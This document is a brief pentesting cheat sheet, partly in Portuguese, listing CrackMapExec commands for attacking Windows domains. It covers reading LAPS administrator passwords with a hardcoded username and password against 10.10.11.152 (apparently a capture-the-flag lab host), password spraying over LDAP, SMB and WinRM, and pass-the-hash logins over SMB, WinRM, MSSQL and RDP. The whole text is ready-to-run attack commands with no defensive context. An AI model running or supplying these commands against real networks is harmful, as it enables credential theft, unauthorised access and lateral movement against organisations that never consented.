Crackmapexec
========================

## LAPS

read LAPS passwords (necessário ter permissão pe LAPS_Readers):

    crackmapexec ldap 10.10.11.152 -u svc_deploy -p E3R$Q62^12p7PLlC%KWaxuaV' -M laps


## Password spraying

    crackmapexec ldap hosts.txt -u users.txt -p P@ssword! --continue
    
    crackmapexec smb 10.10.11.152 -u users.txt -p passwords_test.txt --continue
    
    crackmapexec winrm 10.10.11.152 -u users.txt -p passwords_test.txt --continue

## Pass the hash

    crackmapexec ldap hosts.txt -u users.txt -H :<nthash> --continue
    
    crackmapexec smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
    crackmapexec winrm <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
    crackmapexec mssql <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
    crackmapexec rdp <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>